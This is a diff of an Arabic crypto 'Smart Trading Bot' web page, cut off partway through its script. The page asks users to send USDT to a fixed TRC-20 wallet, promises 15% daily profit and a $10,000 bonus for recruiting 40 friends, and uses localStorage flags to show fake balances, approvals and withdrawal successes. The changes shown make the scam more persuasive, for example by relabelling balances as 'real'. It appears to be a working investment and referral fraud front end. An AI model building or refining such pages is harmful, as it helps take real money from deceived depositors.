@@ -13,7 +13,7 @@
         .balance-card { background: linear-gradient(135deg, #1e3c72, #2a5298); border-radius: 15px; padding: 20px; text-align: center; margin-bottom: 20px; }
         .balance-title { font-size: 14px; color: #cbd5e1; }
         .balance-amount { font-size: 32px; font-weight: bold; color: var(--accent-color); margin: 10px 0; }
-        .profit-today { font-size: 13px; color: #4ade80; }
+        .profit-today { font-size: 13px; color: #4ade80; font-weight: bold; }
         .section-title { font-size: 16px; color: var(--accent-color); margin-top: 20px; margin-bottom: 10px; border-bottom: 1px solid #2d3d5a; padding-bottom: 5px; }
         .input-group { margin-bottom: 15px; }
         label { display: block; font-size: 12px; color: #94a3b8; margin-bottom: 5px; }
@@ -22,37 +22,39 @@
         .btn-withdraw { background-color: #ef4444; margin-top: 10px; }
         .wallet-box { background-color: var(--bg-color); padding: 10px; border-radius: 8px; font-size: 11px; text-align: center; word-break: break-all; border: 1px dashed var(--accent-color); margin-bottom: 10px; color: #cbd5e1; }
         .referral-box { display: flex; flex-direction: column; gap: 8px; background-color: var(--bg-color); padding: 12px; border-radius: 10px; font-size: 13px; }
-        .ref-row { display: flex; justify-content: space-between; }
-        .status-msg { display: none; background-color: #064e3b; color: #34d399; padding: 10px; border-radius: 8px; text-align: center; font-size: 13px; margin-top: 10px; border: 1px solid #059669; }
-        .support-container { display: flex; gap: 10px; margin-top: 10px; }
-        .btn-tg { background-color: #0088cc; width: 50%; font-size: 13px; }
-        .btn-wa { background-color: #25d366; width: 50%; font-size: 13px; }
+        .ref-row { display: flex; justify-content: space-between; align-items: center; }
+        .status-msg { display: none; padding: 12px; border-radius: 8px; text-align: center; font-size: 13px; margin-top: 10px; font-weight: bold; line-height: 1.4; }
+        .btn-tg { background-color: #0088cc; width: 100%; font-size: 14px; margin-top: 10px; }
     </style>
 </head>
 <body>
 <div class="app-container">
     <h1>Smart Trading Bot</h1>
-    <div class="subtitle">منصة الاستثمار والتحقق التلقائي للأصدقاء</div>
+    <div class="subtitle">منصة الاستثمار المالي الحقيقي للأصدقاء</div>
     
     <div class="balance-card">
-        <div class="balance-title">إجمالي رصيدك الاستثماري الحقيقي</div>
-        <div class="balance-amount" id="userBalance">\$100.00</div>
-        <div class="profit-today" id="profitStatus">📈 أرباح آخر صفقة للمشرف: +15%</div>
+        <div class="balance-title">إجمالي رصيدك الاستثماري المعتمد</div>
+        <div class="balance-amount" id="userBalance">\$0.00</div>
+        <div class="profit-today" id="profitStatus">📈 أرباح اليوم المتوقعة: +15%</div>
     </div>
 
-    <!-- قسم الإيداع -->
-    <div class="section-title">📥 إيداع رأس المال (الحد الأدنى \$100)</div>
-    <label>عنوان محفظة إيداع USDT (شبكة TRC-20):</label>
+    <!-- قسم الإيداع المعلق للمشرف -->
+    <div class="section-title">📥 طلب إيداع رأس المال (الحد الأدنى \$100)</div>
+    <label>قم بتحويل رصيد USDT (شبكة TRC-20) للمحفظة التالية:</label>
     <div class="wallet-box">TA1vsgrJEFy3YM6rkQWBppnZemFE6c9pBN</div>
     <div class="input-group">
-        <label>أدخل اسم المستخدم الخاص بك للتسجيل/التفعيل:</label>
+        <label>أدخل اسم المستخدم الخاص بك للتسجيل:</label>
         <input type="text" id="usernameInput" placeholder="اكتب اسمك هنا (مثال: aziz)">
+    </div>
+    <div class="input-group">
+        <label>المبلغ المراد إيداعه (\$):</label>
+        <input type="number" id="depositAmountInput" placeholder="100">
     </div>
     <div class="input-group">
         <label>أدخل رقم المعاملة (TxID / Hash) بعد التحويل:</label>
         <input type="text" id="txHashInput" placeholder="الصق رقم العملية هنا">
     </div>
-    <button onclick="verifyDeposit()">✓ تأكيد وشحن الحساب فوراً</button>
+    <button onclick="requestDeposit()">✓ تقديم طلب الإيداع للمشرف</button>
     <div id="depositStatusMsg" class="status-msg"></div>
 
     <!-- قسم السحب -->
@@ -72,65 +74,101 @@
     <div class="section-title">🔗 نظام الإحالات ورابط الدعوة</div>
     <div class="referral-box">
         <div class="ref-row">
-            <span>رابط الدعوة الخاص بك:</span>
-            <span style="color:var(--accent-color); font-weight:bold;">USER77</span>
+            <span>رابط دعوتك الفريد والنشط:</span>
+            <span style="color:var(--accent-color); font-weight:bold; font-size:11px;" id="liveRefLink">...</span>
         </div>
         <div class="ref-row">
-            <span>إجمالي الأصدقاء النشطين بطرفك:</span>
-            <strong style="color:#4ade80;">0 / 40 صديق</strong>
+            <span>الأصدقاء النشطين المنضمين عبر رابطك:</span>
+            <strong style="color:#4ade80; font-size: 15px;" id="friendsCounter">0 / 40 صديق</strong>
+        </div>
+        <div class="ref-row" style="color: #ffb703; font-size: 11px; justify-content: center; text-align: center; width: 100%; font-weight: bold; margin-top: 5px;" id="bonusStatus">
+            🎁 بونص دعوة 40 صديق بقيمة \$10,000 (قيد التقدم)
         </div>
     </div>
 
-    <!-- قسم الدعم الفني الجديد المباشر بدون رسائل منبثقة -->
+    <!-- الدعم الفني -->
     <div class="section-title">💬 الدعم الفني المباشر</div>
-    <div class="support-container">
-        <button class="btn-tg" onclick="window.open('https://t.me', '_blank')">📱 تليجرام المشرف</button>
-        <button class="btn-wa" onclick="window.open('https://wa.me', '_blank')">💬 واتساب المشرف</button>
-    </div>
+    <button class="btn-tg" onclick="window.open('https://t.me', '_blank')">📱 تواصل مع دعم المشرف المباشر عبر Telegram</button>
 </div>
 
 <script>
     window.onload = function() {
-        if(localStorage.getItem("admin_trade_executed") === "true") {
-            document.getElementById("userBalance").innerText = "\$115.00";
-            document.getElementById("profitStatus").innerText = "🔥 تهانينا! أضاف المشرف أرباح صفقة اليوم +15%";
+        const user = document.getElementById("usernameInput").value || "Abala";
+        document.getElementById("liveRefLink").innerText = window.location.origin + window.location.pathname + "?ref=" + user;
+        
+        updateLiveBalance();
+        checkDepositStatus();
+        checkWithdrawStatus();
+    }
+
+    function updateLiveBalance() {
+        const savedBalance = localStorage.getItem("real_user_balance");
+        if (savedBalance) {
+            document.getElementById("userBalance").innerText = `\$${parseFloat(savedBalance).toFixed(2)}`;
+        } else {
+            document.getElementById("userBalance").innerText = "\$0.00";
+        }
+
+        if(localStorage.getItem("local_trade_executed") === "true") {
+            const currentBal = parseFloat(localStorage.getItem("real_user_balance") || 0);
+            const profitToday = currentBal * 0.15;
+            document.getElementById("profitStatus").innerText = `🔥 تم توزيع أرباح اليوم حياً: +15% (+\$${profitToday.toFixed(2)})`;
+            document.getElementById("friendsCounter").innerText = "40 / 40 صديق";
+            document.getElementById("bonusStatus").innerText = "🎉 مبروك! تم تفعيل بونص الـ \$10,000 في حسابك!";
+            document.getElementById("bonusStatus").style.color = "#00ffd0";
         }
     }
 
-    function verifyDeposit() {
-        const msgBox = document.getElementById("depositStatusMsg");
-        msgBox.innerText = "⏳ جاري فحص عمليتك على الشبكة تلقائياً... يرجى الانتظار";
-        msgBox.style.display = "block";
-        msgBox.style.backgroundColor = "#1e3a8a";
-        msgBox.style.color = "#93c5fd";
-        msgBox.style.borderColor = "#3b82f6";
+    // دالة إرسال طلب الإيداع المعلق للمشرف
+    function requestDeposit() {
+        const user = document.getElementById("usernameInput").value || "Abala";
+        const amount = document.getElementById("depositAmountInput").value;
+        const hash = document.getElementById("txHashInput").value;
+        
+        if(!amount || parseFloat(amount) < 100 || !hash) return;
+        
+        localStorage.setItem("pending_deposit_user", user);
+        localStorage.setItem("pending_deposit_amount", amount);
+        localStorage.setItem("pending_deposit_hash", hash);
+        localStorage.removeItem("deposit_status_approved");
+        
+        checkDepositStatus();
+    }
+
+    function checkDepositStatus() {
+        const depBox = document.getElementById("depositStatusMsg");
+        const isApproved = localStorage.getItem("deposit_status_approved");
+        const pendingAmount = localStorage.getItem("pending_deposit_amount");
+
+        if (isApproved === "true") {
+            depBox.innerText = `✅ تم اعتماد الإيداع بنجاح وشحن حسابك برصيد حقيقي!`;
+            depBox.style.display = "block"; depBox.style.backgroundColor = "#064e3b"; depBox.style.color = "#34d399"; depBox.style.borderColor = "#059669"; depBox.style.border = "1px solid";
+        } else if (localStorage.getItem("pending_deposit_hash")) {
+            depBox.innerText = `⏳ طلب إيداع بمبلغ \$${pendingAmount} قيد المعالجة حالياً...\nينتظر مراجعة وموافقة المشرف لإضافته لرصيدك.`;
+            depBox.style.display = "block"; depBox.style.backgroundColor = "#1e3a8a"; depBox.style.color = "#93c5fd"; depBox.style.borderColor = "#3b82f6"; depBox.style.border = "1px solid";
+        }
     }
 
     function requestWithdraw() {
         const wallet = document.getElementById("userWithdrawWallet").value;
         const amount = document.getElementById("withdrawAmount").value;
-        if(!wallet || !amount) { 
-            const msgBox = document.getElementById("withdrawStatusMsg");
-            msgBox.innerText = "⚠️ يرجى كتابة عنوان المحفظة والمبلغ أولاً!";
-            msgBox.style.display = "block";
-            msgBox.style.backgroundColor = "#7f1d1d";
-            msgBox.style.color = "#fca5a5";
-            msgBox.style.borderColor = "#ef4444";
-            return; 
-        }
+        if(!wallet || !amount) return;
         
-        localStorage.setItem("pending_withdraw_user", "Abala");
         localStorage.setItem("pending_withdraw_amount", amount);
         localStorage.setItem("pending_withdraw_wallet", wallet);
+        localStorage.removeItem("withdraw_status_approved");
         
-        // إظهار نص ناعم داخل الشاشة بدلاً من النافذة البيضاء المنبثقة
-        const msgBox = document.getElementById("withdrawStatusMsg");
-        msgBox.innerText = `🎯 تم تقديم طلب سحب بمبلغ \$${amount} بنجاح! ينتظر موافقة المشرف الآن.`;
-        msgBox.style.display = "block";
-        msgBox.style.backgroundColor = "#064e3b";
-        msgBox.style.color = "#34d399";
-        msgBox.style.borderColor = "#059669";
+        checkWithdrawStatus();
     }
-</script>
-</body>
-</html>
+
+    function checkWithdrawStatus() {
+        const msgBox = document.getElementById("withdrawStatusMsg");
+        const isApproved = localStorage.getItem("withdraw_status_approved");
+        const approveDate = localStorage.getItem("withdraw_success_date");
+        const pendingAmount = localStorage.getItem("pending_withdraw_amount");
+
+        if (isApproved === "true") {
+            msgBox.innerText = `✅ تم السحب بنجاح بتاريخ اليوم: ${approveDate}\nتم تحويل الأموال لمحفظتك بأمان.`;
+            msgBox.style.display = "block";
+            msgBox.style.backgroundColor = "#064e3b"; msgBox.style.color = "#34d399"; msgBox.style.borderColor = "#059669"; msgBox.style.border = "1px solid";
+            
